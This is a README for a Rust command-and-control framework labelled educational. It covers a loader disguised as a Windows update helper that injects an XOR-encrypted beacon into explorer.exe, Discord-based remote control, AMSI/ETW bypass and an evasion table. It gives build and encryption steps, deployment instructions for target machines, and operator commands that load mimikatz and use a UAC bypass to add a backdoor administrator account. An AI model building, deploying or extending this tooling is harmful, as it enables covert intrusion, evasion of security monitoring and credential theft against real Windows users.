# FrameworkC2 - Educational C2 Framework in Rust

> **DISCLAIMER**: This project is for **EDUCATIONAL AND RESEARCH PURPOSES ONLY**. 
> Do not use this code for malicious purposes. The authors are not responsible for any misuse.

## Overview

FrameworkC2 is a modular Command & Control framework written in Rust, designed to demonstrate:
- PE parsing and reflective loading techniques
- Indirect syscalls for API evasion
- Discord-based C2 communication
- AMSI/ETW bypass techniques
- Cross-compilation from macOS/Linux to Windows

## Architecture

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                            OPERATOR (Discord)                                │
│                                                                              │
│   ┌─────────────┐     ┌─────────────┐     ┌─────────────┐                   │
│   │ shell cmd   │     │    scr      │     │  !loaddll   │                   │
│   └──────┬──────┘     └──────┬──────┘     └──────┬──────┘                   │
│          │                   │                   │                           │
└──────────┼───────────────────┼───────────────────┼───────────────────────────┘
           │                   │                   │
           ▼                   ▼                   ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│                              BEACON.DLL                                      │
│  ┌──────────────────────────────────────────────────────────────────────┐   │
│  │  Discord Polling Loop                                                 │   │
│  │  ├─ Receive commands                                                  │   │
│  │  ├─ Execute (shell, screenshot, loaddll)                              │   │
│  │  └─ Send results back                                                 │   │
│  └──────────────────────────────────────────────────────────────────────┘   │
│                                    │                                         │
│                                    ▼                                         │
│  ┌──────────────────────────────────────────────────────────────────────┐   │
│  │  PE Loader (c2_common)                                                │   │
│  │  ├─ Parse PE                                                          │   │
│  │  ├─ Allocate memory                                                   │   │
│  │  ├─ Map sections                                                      │   │
│  │  ├─ Apply relocations                                                 │   │
│  │  ├─ Resolve imports (IAT)                                             │   │
│  │  ├─ Protect sections                                                  │   │
│  │  └─ Call DllMain                                                      │   │
│  └──────────────────────────────────────────────────────────────────────┘   │
│                                                                              │
│  ┌──────────────────────────────────────────────────────────────────────┐   │
│  │  Bypass (AMSI/ETW)                                                    │   │
│  │  └─ Hardware breakpoints + VEH                                        │   │
│  └──────────────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────────────┘
           ▲
           │ DllMain (auto-start)
           │
┌─────────────────────────────────────────────────────────────────────────────┐
│                              LOADER.EXE                                      │
│  ┌──────────────────────────────────────────────────────────────────────┐   │
│  │  1. Decrypt beacon.dll (XOR)                                          │   │
│  │  2. Find explorer.exe                                                 │   │
│  │  3. NtOpenProcess                                                     │   │
│  │  4. NtAllocateVirtualMemory                                           │   │
│  │  5. Map PE + relocations locally                                      │   │
│  │  6. NtWriteVirtualMemory                                              │   │
│  │  7. NtProtectVirtualMemory                                            │   │
│  │  8. NtCreateThreadEx → DllMain                                        │   │
│  └──────────────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────────────┘
```

## Project Structure

```
FrameworkC2/
├── Cargo.toml                 # Workspace configuration
├── README.md                  # This file
│
├── common/                    # Shared library (c2_common)
│   ├── Cargo.toml
│   └── src/
│       ├── lib.rs
│       ├── syscalls/          # Indirect syscalls
│       │   ├── mod.rs
│       │   ├── obf.rs         # String obfuscation, DJB2 hash
│       │   ├── resolve.rs     # SSN resolution via PEB
│       │   └── syscall.rs     # syscall! macro + ASM
│       └── pe/                # PE Loader
│           ├── mod.rs
│           ├── structs.rs     # PE structures
│           ├── parser.rs      # PE parser
│           └── loader.rs      # Full PE loader
│
├── loader/                    # Initial loader (EXE)
│   ├── Cargo.toml
│   └── src/main.rs            # Injection into explorer.exe
│
├── beacon_rust/               # Beacon DLL
│   ├── Cargo.toml
│   ├── config.toml            # Embedded configuration
│   └── src/
│       ├── lib.rs             # DllMain + exports
│       ├── config.rs          # Config loading
│       ├── error.rs           # Error types
│       ├── bypass.rs          # AMSI/ETW bypass
│       ├── discord/           # Discord C2
│       │   ├── mod.rs
│       │   ├── client.rs      # API client
│       │   └── models.rs      # Data structures
│       └── commands/          # Command handlers
│           ├── mod.rs
│           ├── models.rs      # Command enum
│           ├── shell.rs       # PowerShell execution
│           ├── screenshot.rs  # Multi-monitor capture
│           └── loaddll.rs     # PE loader integration
│
├── tools/                     # Helper tools
│   └── xor_encrypt.py         # XOR encryption for payloads
│
├── beacon/                    # [Legacy] C beacon
├── loader_rust/               # [Legacy] Old loader
├── reflective_dll/            # [Legacy] Reflective DLL
└── test_dll/                  # Simple test DLL
```

## Features

### Loader (WinUpdateHelper.exe)
- Indirect syscalls (no direct ntdll calls)
- PE parsing and remote mapping
- Relocation patching
- Section memory protection
- Thread creation at DllMain

### Beacon (beacon.dll)
- Auto-start on DllMain (spawns worker thread)
- Discord C2 communication
- AMSI/ETW bypass (hardware breakpoints)
- Commands:
  - `shell <command>` - Execute PowerShell
  - `scr` - Screenshot all monitors
  - `!loaddll` - Load DLL from attachment (XOR encrypted)
  - `!uacbypass [cmd]` - Execute command with elevated privileges (UAC bypass)
  - `help` - Show available commands

### PE Loader (c2_common)
- Full PE64 parsing
- Section mapping
- Base relocations (DIR64, HIGHLOW)
- Import resolution (IAT)
- TLS callbacks support
- Memory protection per section

## Building

### Prerequisites

```bash
# Install Rust
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh

# Add Windows target
rustup target add x86_64-pc-windows-gnu

# Install MinGW (macOS)
brew install mingw-w64

# Install MinGW (Ubuntu/Debian)
sudo apt install mingw-w64
```

### Build Commands

```bash
cd FrameworkC2

# Build everything
cargo build --release --target x86_64-pc-windows-gnu

# Build specific crate
cargo build --release --target x86_64-pc-windows-gnu --package beacon
cargo build --release --target x86_64-pc-windows-gnu --package loader

# Output files
ls -la target/x86_64-pc-windows-gnu/release/
# - beacon.dll      (~2.2 MB)
# - loader.exe      (~1.1 MB)
```

### Encrypt Beacon for Loader

```bash
# Encrypt beacon.dll for embedding in loader
python3 tools/xor_encrypt.py \
    target/x86_64-pc-windows-gnu/release/beacon.dll \
    target/x86_64-pc-windows-gnu/release/beacon.dll.enc \
    $(echo -n "Fr4m3w0rkC2_K3y!" | xxd -p)

# Rebuild loader with embedded beacon
cargo build --release --target x86_64-pc-windows-gnu \
    --package loader --features embedded_beacon
```

## Configuration

### Beacon Configuration

Edit `beacon_rust/config.toml` before building:

```toml
[discord]
api_url = "https://discord.com/api/v10"
bot_token = "YOUR_BOT_TOKEN_HERE"
guild_id = "YOUR_GUILD_ID_HERE"
general_channel_id = "YOUR_CHANNEL_ID_HERE"

[settings]
poll_interval_secs = 5

[crypto]
xor_key = "41"  # Hex key for loaddll decryption
```

### Discord Bot Setup

1. Go to [Discord Developer Portal](https://discord.com/developers/applications)
2. Create a new application
3. Go to "Bot" section, create a bot
4. Enable "Message Content Intent"
5. Copy the bot token
6. Go to OAuth2 → URL Generator:
   - Scopes: `bot`
   - Permissions: `Manage Channels`, `Send Messages`, `Attach Files`, `Read Message History`
7. Invite bot to your server
8. Get Guild ID and Channel ID (enable Developer Mode in Discord settings)

## Usage

### Basic Flow

```
1. Configure beacon_rust/config.toml with Discord credentials
2. Build: cargo build --release --target x86_64-pc-windows-gnu
3. Encrypt beacon: python3 tools/xor_encrypt.py beacon.dll beacon.dll.enc
4. Deploy loader.exe to target Windows machine
5. Execute loader.exe → injects beacon.dll into explorer.exe
6. Beacon connects to Discord, creates channel with hostname
7. Send commands in the created channel
```

### Commands

```
# Execute PowerShell command
shell whoami

# Execute with output
shell systeminfo

# Take screenshot
scr

# Load additional DLL (XOR encrypted, attached to message)
!loaddll

# Load specific DLL by name
!loaddll mimikatz.dll

# UAC Bypass - spawn elevated cmd.exe
!uacbypass

# UAC Bypass - execute command with elevated privileges
!uacbypass net user hacker Password123! /add
!uacbypass net localgroup administrators hacker /add

# Show help
help
```

### Loading Additional DLLs

**Important**: DLLs must be compiled **without the C Runtime (CRT)** to work with the PE Loader.
See `test_dll/README.md` for detailed instructions.

```bash
# Compile DLL without CRT (required!)
x86_64-w64-mingw32-gcc -shared -nostdlib -e DllMain -o payload.dll payload.c -lkernel32 -luser32

# Encrypt DLL for loading
python3 tools/xor_encrypt.py payload.dll payload.dll.enc 41

# In Discord:
# 1. Attach payload.dll.enc to message
# 2. Type: !loaddll
# 3. Beacon downloads, decrypts, and loads the DLL
```

**Note**: The beacon prevents loading the same DLL twice (detected via hash). You'll get an error message with the existing base address if you try.

## Technical Details

### Indirect Syscalls

The framework uses indirect syscalls to avoid EDR hooks:

```rust
// Resolve SSN from ntdll (unhook-resistant)
let ssn = resolve_ssn("NtAllocateVirtualMemory");

// Execute syscall via syscall instruction
syscall!(
    "NtAllocateVirtualMemory",
    process_handle,
    &mut base_address,
    0,
    &mut size,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_READWRITE
);
```

### PE Loading Process

1. **Parse PE** - Extract headers, sections, directories
2. **Allocate** - Reserve memory at preferred base (or relocate)
3. **Map Sections** - Copy each section to correct RVA
4. **Relocate** - Patch addresses if base differs
5. **Resolve IAT** - Fill import address table
6. **Protect** - Set correct page protections
7. **TLS** - Call TLS callbacks if present
8. **DllMain** - Call entry point with DLL_PROCESS_ATTACH

### AMSI/ETW Bypass

Uses hardware breakpoints (Dr0-Dr3) to intercept:
- `AmsiScanBuffer` - Returns clean result
- `NtTraceControl` - Skips to ret instruction

## Evasion Techniques

| Technique | Description |
|-----------|-------------|
| Indirect Syscalls | Bypass userland hooks |
| PE Loading | No LoadLibrary calls |
| XOR Encryption | Evade static signatures |
| Hardware Breakpoints | Userland-only bypass |
| String Obfuscation | Compile-time XOR |
| No Console | DLL runs silently |

## Limitations

- Windows x64 only
- Requires bot token (operational security consideration)
- Large DLL size due to Rust runtime
- Screenshot requires GUI session

## Development

### Adding New Commands

1. Add variant to `Command` enum in `commands/models.rs`
2. Implement handler in `commands/` module
3. Add match arm in `discord/client.rs` → `process_command()`
4. Update help text in `commands/models.rs`

### Debugging

```bash
# Build with debug symbols
cargo build --target x86_64-pc-windows-gnu

# Enable debug output in loader
# (debug_println! macros only active in debug builds)
```

## License

This project is provided for educational purposes only. No license for production use.

## References

- [PE Format Specification](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format)
- [Windows Syscalls](https://j00ru.vexillium.org/syscalls/nt/64/)
- [AMSI Bypass Techniques](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)
- [Discord API](https://discord.com/developers/docs/intro)
